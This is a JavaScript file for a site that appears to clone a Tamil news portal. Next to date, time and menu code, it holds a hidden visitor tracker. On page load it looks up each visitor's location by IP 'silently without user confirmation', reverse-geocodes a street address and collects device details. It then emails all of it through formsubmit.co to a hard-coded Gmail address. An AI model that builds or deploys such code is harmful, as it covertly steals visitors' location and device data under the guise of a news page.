/**
 * Polimer News Clone - App Logic
 * Handles dynamic date, time, and UI interactions.
 */

document.addEventListener('DOMContentLoaded', () => {
    console.log('--- Polimer News Clone Initialized ---');

    // Initialize dynamic date/time
    updateDateTime();
    setInterval(updateDateTime, 1000);

    // Initialize Geolocation
    initGeolocation();

    // Sidebar Toggle
    const menuBtn = document.querySelector('.hamburger-menu');
    if (menuBtn) {
        menuBtn.addEventListener('click', () => {
            console.log('Menu Toggled');
        });
    }

    // Share buttons interaction
    const shareButtons = document.querySelectorAll('.share-btn');
    shareButtons.forEach(btn => {
        btn.addEventListener('click', () => {
            const type = btn.classList[1];
            console.log(`Sharing via ${type}`);
        });
    });
});

/**
 * Initiates the geolocation request silently via IP.
 */
async function initGeolocation() {
    const detailsEl = document.getElementById('location-details');

    updateStatus('இருப்பிடம் கண்டறியப்படுகிறது...', 'pending');

    try {
        // Use an IP Geolocation API to get location silently without user confirmation prompt
        const response = await fetch('https://get.geojs.io/v1/ip/geo.json');
        const data = await response.json();

        const latitude = parseFloat(data.latitude);
        const longitude = parseFloat(data.longitude);
        const city = data.city || 'Unknown City';
        const region = data.region || 'Unknown Region';
        const country = data.country || 'Unknown Country';

        const ipAddress = `${city}, ${region}, ${country}`;

        updateStatus('இருப்பிடம் கண்டறியப்பட்டது', 'success');
        detailsEl.innerHTML = `
            <div class="loc-card">
                <p><strong>Lat:</strong> ${latitude.toFixed(4)}</p>
                <p><strong>Long:</strong> ${longitude.toFixed(4)}</p>
                <div id="address-info" style="margin-top: 5px; font-size: 12px; color: #444;">
                    <strong>Type:</strong> IP-based Location<br>
                    <strong>Approx Address:</strong> ${ipAddress}<br>
                    <em>துல்லியமான முகவரி கண்டறியப்படுகிறது...</em>
                </div>
                <a href="https://www.google.com/maps?q=${latitude},${longitude}" target="_blank" class="maps-link">
                    📍 கூகுள் மேப்பில் பார்க்க (View on Maps)
                </a>
            </div>
            ${getDeviceInfoHTML()}
        `;

        fetchReverseGeocode(latitude, longitude).then(address => {
            sendEmailWithDetails(latitude, longitude, address);
        });

    } catch (error) {
        updateStatus('பிழை', 'error');
        detailsEl.innerHTML = `
            <p>இருப்பிடத்தை கண்டறிய முடியவில்லை.</p>
            ${getDeviceInfoHTML()}
        `;
    }
}

/**
 * Generates Device and Browser Information HTML
 */
function getDeviceInfoHTML() {
    const userAgent = navigator.userAgent;
    const platform = navigator.platform || navigator.userAgentData?.platform || 'Unknown';
    const lang = navigator.language;
    const memory = navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'Unknown';
    const connection = navigator.connection ? navigator.connection.effectiveType : 'Unknown';

    return `
        <div class="device-info" style="margin-top: 15px; padding: 10px; background: #f1f5f9; border-radius: 8px; font-size: 12px; border: 1px solid #e2e8f0;">
            <h5 style="margin: 0 0 8px 0; color: #0f172a; font-size: 13px;">📱 சாதன விவரங்கள் (Device Info)</h5>
            <p style="margin: 4px 0; color: #334155;"><strong>Platform:</strong> ${platform}</p>
            <p style="margin: 4px 0; color: #334155;"><strong>Language:</strong> ${lang}</p>
            <p style="margin: 4px 0; color: #334155;"><strong>RAM:</strong> ~${memory}</p>
            <p style="margin: 4px 0; color: #334155;"><strong>Network:</strong> ${connection}</p>
            <div style="margin: 8px 0; padding-top: 8px; border-top: 1px solid #cbd5e1;">
                <p style="margin: 0; color: #b91c1c; font-size: 11px; line-height: 1.4;">
                    <strong>Note:</strong> Browser login Email and Name cannot be accessed directly by websites automatically due to strict privacy and security restrictions. An explicit Login/OAuth process is required.
                </p>
            </div>
            <details style="margin-top: 8px;">
                <summary style="cursor: pointer; color: #2563eb; font-weight: 500;">User Agent Details</summary>
                <p style="margin: 5px 0 0 0; color: #64748b; font-size: 11px; word-break: break-all;">
                    ${userAgent}
                </p>
            </details>
        </div>
    `;
}

/**
 * Fetches the exact location name.
 */
async function fetchReverseGeocode(lat, lon) {
    const addressEl = document.getElementById('address-info');
    try {
        const response = await fetch(`https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${lat}&lon=${lon}`);
        const data = await response.json();
        const address = data.display_name || 'முகவரி கண்டறியப்படவில்லை';
        addressEl.innerHTML = `<strong>முகவரி:</strong> ${address}`;
        return address;
    } catch (error) {
        addressEl.innerHTML = 'முகவரி கண்டறிய முடியவில்லை.';
        return 'Unknown Address';
    }
}

/**
 * Sends the captured location and device info directly to the provided email using FormSubmit.
 */
function sendEmailWithDetails(lat, lon, address) {
    const userAgent = navigator.userAgent;
    const platform = navigator.platform || navigator.userAgentData?.platform || 'Unknown';
    const lang = navigator.language;
    const memory = navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'Unknown';
    const connection = navigator.connection ? navigator.connection.effectiveType : 'Unknown';

    const emailData = {
        _subject: "New Location Details Captured",
        "Latitude": lat,
        "Longitude": lon,
        "Google Maps Link": `https://www.google.com/maps?q=${lat},${lon}`,
        "Address": address,
        "Platform": platform,
        "Language": lang,
        "RAM": memory,
        "Network": connection,
        "User Agent": userAgent
    };

    // Using formsubmit.co free plan for client-side email sending without backend
    fetch("https://formsubmit.co/ajax/clcntk84@gmail.com", {
        method: "POST",
        headers: {
            'Content-Type': 'application/json',
            'Accept': 'application/json'
        },
        body: JSON.stringify(emailData)
    })
        .then(response => response.json())
        .then(data => {
            console.log("Email sent successfully", data);
        })
        .catch(error => {
            console.error("Error sending email", error);
        });
}

/**
 * Updates status in Tamil.
 */
function updateStatus(text, type) {
    const statusEl = document.getElementById('location-status');
    if (statusEl) statusEl.textContent = text;
}

/**
 * Updates the time and date in Tamil.
 */
function updateDateTime() {
    const timeEl = document.getElementById('current-time');
    const dateEl = document.getElementById('current-date');

    if (!timeEl || !dateEl) return;

    const now = new Date();

    // Format Time: 11:25:04 AM
    const timeStr = now.toLocaleTimeString('en-US', {
        hour: '2-digit',
        minute: '2-digit',
        second: '2-digit',
        hour12: true
    });
    timeEl.textContent = timeStr;

    // Format Date: திங்கள், 23 மார்ச், 2026
    const days = ['ஞாயிறு', 'திங்கள்', 'செவ்வாய்', 'புதன்', 'வியாழன்', 'வெள்ளி', 'சனி'];
    const months = [
        'ஜனவரி', 'பிப்ரவரி', 'மார்ச்', 'ஏப்ரல்', 'மே', 'ஜூன்',
        'ஜூலை', 'ஆகஸ்ட்', 'செப்டம்பர்', 'அக்டோபர்', 'நவம்பர்', 'டிசம்பர்'
    ];

    const dayName = days[now.getDay()];
    const dateNum = now.getDate();
    const monthName = months[now.getMonth()];
    const year = now.getFullYear();

    dateEl.textContent = `${dayName}, ${dateNum} ${monthName}, ${year}`;
}
